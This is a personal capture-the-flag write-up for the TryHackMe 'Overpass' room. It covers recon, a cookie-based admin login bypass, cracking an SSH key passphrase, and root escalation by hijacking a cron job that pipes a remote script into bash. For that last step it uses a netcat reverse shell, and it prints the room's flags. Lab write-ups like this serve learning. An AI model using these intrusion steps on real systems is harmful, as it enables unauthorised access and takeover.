@@ -1,0 +1,117 @@
+TryHackMe Write Up
+Room: Overpass
+by: Jake Brzeczek
+8/11/2022
+	
+Tasks:
+1. Hack the machine and get the flag in user.txt
+2. Escalate your privileges and get the flag in root.txt
+
+PART 1:
+
+Start by scanning target IP address with nmap 
+	$ sudo nmap -sS -v -sV [IP ADDR]
+
+In this scan I discovered:
+	OS: Linux Ubuntu
+	Open Ports: 22/tcp/ssh, 80/tcp/http
+
+Next, I visited the target IP ADDR web page in my web browser to investigate. 
+	Viewed the source code 
+	Found clue in src "just because the Romans used it doesn't make it military grade, change this?"
+	Additional clues found in overpass.go - ROT-47 Cipher online decoder
+	
+Download program from IPADDR/downloads
+	$ chmod +x overpassLinux
+	$ ./overpassLinux
+	
+Scanned for directories and DNS subdomains with gobuster
+	$ gobuster dir -u "IP ADDR" -v -w /usr/share/dirb/wordlist/common.txt
+	$ cat results.txt | grep "Found:"
+	Found: /aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+	Found: /admin                (Status: 301) [Size: 42] [--> /admin/]
+	Found: /css                  (Status: 301) [Size: 0] [--> css/]
+	Found: /downloads            (Status: 301) [Size: 0] [--> downloads/]
+	Found: /img                  (Status: 301) [Size: 0] [--> img/]
+	Found: /index.html           (Status: 301) [Size: 0] [--> ./]
+	
+Investigate http://IPADDR/admin
+	View sorce code
+	Viewed /login.js
+	Found clue: Cookie.set("SessionToken", StatusorCookie)
+	
+Tested this vulnerability in the terminal 
+	curl "http://IPADDR/admin/" --cookie "SessionToken=Jake"
+	This resulted in me obtaining a private key which means this vulnerability works.
+	
+Opened http://IPADDR/admin 
+	Opened the web console 
+	Pasted Cookie.set("SessionToken", "Jake")
+	Refreshed the page and gained access to the admin page.
+	
+Saved the private key to a txt file as id_rsa.txt
+	Cracked the private key with john
+	$ ssh2john id_rsa.txt > forjohn.txt
+	$ john forjohn.txt
+	Obtained password: james13          (id_rsa.txt) 
+	
+Connected to the machine via ssh 
+	$ ssh -i id_rsa.txt james@IPADDR 
+	$ james13
+	
+Obtained first flag
+	$ ls
+	$ cat user.txt
+	$ thm{65c1aaf000506e56996822c6281e6bf7} 
+	
+PART 2
+
+Search directory for clues
+	$ ls 
+	$ cat todo.txt
+	clue: "how he got the automated build script working and where the builds go."
+	
+Search for automated jobs 
+	$ cat /etc/crontab 
+	clue: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+	
+Investigrate host files
+	$ ls -la /etc | grep host
+	everyone has the ability to read/write, including user james. This is the vulnerability. 
+	$ cat /etc/hosts
+	
+Edit host file so that the overpass.thm is linked to my ip address
+	$ nano /etc/hosts
+	
+Create an idential directory structure to the overpass.thm on the target machine
+	Create directory stucture:  overpass.thm/downloads/src/buildscript.sh
+	$ mkdir downloads
+	$ cd downloads
+	$ mkdir src
+	$ cd src
+	$ nano buildscript.sh
+	
+Create reverse shell script 
+	I used the Firefox hacker tools browser extension to create Netcat reverseshell 
+	Copied the reverse shell script and pasted into buildscript.sh
+	
+Create python web server on my machine
+	$ sudo python3 http.server
+	
+
+Copy the overpass.thm directory structure to the default apache web server
+	$ cp ~/Desktop/tryhackme/downloads/src/buildscript.sh /var/www/html/downloads/src
+	$ sudo /etc/init.d/apache2 restart
+	
+
+Start a netcat listen 
+	$ nc -lvp [port]
+	wait for the cronjob to initiate the reverse shell
+	
+Obtain second flag
+	$ id
+	$ ls 
+	$ cat root.txt
+	thm{7f336f8c359dbac18d54fdd64ea753bb}
+	
+FINISHED!!!
